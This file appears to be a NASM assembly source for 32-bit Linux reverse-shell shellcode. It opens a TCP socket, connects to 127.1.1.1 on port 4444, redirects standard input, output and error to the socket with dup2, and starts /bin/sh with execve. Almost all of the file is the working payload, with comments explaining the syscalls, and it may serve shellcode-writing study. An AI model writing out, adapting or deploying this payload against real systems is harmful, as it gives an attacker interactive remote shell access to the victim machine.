       global _start

    section .text
    _start:

        push 0x66           ; socketcall syscall
        pop eax

        push 1            ; SYS_SOCKET call argument
        pop ebx

        ; sys_socket arguments
        xor edi, edi        ; reset esi register
        push edi            ; IPPROTO_IP (0x0)
        push ebx            ; SOCK_STREAM (0x1)
        push 2              ; AF_INET (0x2)
        mov ecx, esp        ; pointer to the args

        int 0x80            ; exec sys_socket socketcall syscall
        pop edi             ; to save eax

        ; switch eax and edi. edi now contains sockfd

        xor edi, eax
        xor eax, edi
        xor edi, eax

    ; ======== reverse section START here ======================

    ; here instead of eax ==> al
    mov al, 0x66      ; socketcall syscall
    push 0x3
    pop ebx
    ;mov ebx, 0x3
        ; srv_addr
    push 0x0101017f      ; sin_addr=127.1.1.1
    push word 0x5c11     ; sin_port=4444
    push word 2        ; sin_family = AF_INET (0x2)

    ; ========= reverse section STOP here ======================

        mov ecx, esp     ;save pointer to sockaddr struct
     
        push dword 16 ; addrlen=16 ==> 0x10 HEX
        push ecx  ;pointer to sockaddr
        push edi  ;sockfd
     
        mov ecx, esp ;save pointer to sockaddr_in struct
        int 0x80 ; exec sys_connect
     
        ;
        ; int socketcall(int call, unsigned long *args);
        ; int dup2(int oldfd, int newfd);
        ;
    ; == STD ==

        pop ecx             ; removes socketfd from stack
        pop ecx             ; remove addr (0x0) from stack

    push 0x2
    pop ecx
       ; mov ecx, 2         ; set loop counter to 2

    ; =================================================
    ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)

    loop:
    ; here instead of eax ==> al
        mov al, 0x3f  ;syscall: sys_dup2 ==> 63
        int 0x80     ;exec sys_dup2
        dec ecx         ;decrement loop-counter
        jns loop     ;as long as SF is not set -> jmp to loop
     
        ;
        ; int execve(const char *filename, char *const argv[],char *const envp[]);
        ;
    ; ========================================
            xor eax, eax        ; Zero out eax
        push eax        ; Push 0 onto stack (null terminator)
        push dword 0x68732f2f    ; push “//sh”
        push dword 0x6e69622f    ; push “/bin”
        mov ebx, esp        ; Set ebx to our stack pointer
        mov ecx, eax        ; Set ecx to 0
        mov edx, eax        ; Set edx to 0
    ; here eax ==> al
        mov al, 0xb        ; Set eax to 11
        int 0x80        ; Make the syscall execve(“/bin/sh”,0,0)
